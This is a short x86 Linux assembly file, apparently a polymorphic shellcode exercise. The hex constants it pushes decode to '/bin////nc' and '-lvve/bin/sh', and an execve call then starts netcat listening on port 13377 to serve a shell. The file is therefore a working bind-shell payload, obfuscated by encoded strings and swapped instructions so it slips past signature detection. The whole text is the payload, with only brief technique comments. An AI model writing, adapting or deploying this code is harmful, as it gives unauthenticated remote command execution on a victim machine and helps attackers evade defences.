section .text
    global _start
_start:
	xor ecx,ecx
	mul ecx          ; mul technique to clear out EAX and EDX
	
	jmp short arg1   ; jmp/call/pop technique

poptag1:
    pop edx          ; replace the push opcode
    push eax

	push 0x68732f6e
	push 0x69622f65
	push 0x76766c2d
	mov ecx,esp

	push eax
	push 0x636e2f2f
	push 0x2f2f2f2f
	push 0x6e69622f
	mov ebx, esp

	push eax
	push edx
	push ecx
	push ebx
	
	mov edx,eax      ; replace the xor opcode
	mov  ecx,esp
	mov al,11        ; execve syscall
	int 0x80

arg1:
	call poptag1
	string1 db "-vp13377"
